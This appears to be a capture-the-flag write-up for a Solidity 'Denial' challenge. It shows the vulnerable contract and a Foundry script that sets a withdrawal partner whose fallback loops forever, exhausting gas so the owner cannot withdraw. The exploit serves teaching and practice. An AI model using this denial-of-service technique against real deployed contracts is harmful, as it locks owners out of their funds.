# Analysis

---

The goal is “deny the owner from withdrawing funds when they call withdraw()”.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

The `withdraw()` function performs a `call()` to the partner and a `transfer()` to the owner; the partner address can be updated via the `setWithdrawPartner()` function.

# Exploit

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Denial.sol";
import "forge-std/Script.sol";

contract Ex {
    fallback() external payable {
        while (true) {}
    }
}

contract DenialSol is Script {
    Denial public den_ = Denial(payable(0x5c7A580EEE3627a66e3C4df5875a27401A47dCB6));

    function run() external {
        vm.startBroadcast();

        Ex ex = new Ex();
        den_.setWithdrawPartner(address(ex));

        vm.stopBroadcast();
    }
}
```

The Ex contract enters an infinite loop when called.
Setting the `partner` to this contract can prevent the `owner` from withdrawing funds.
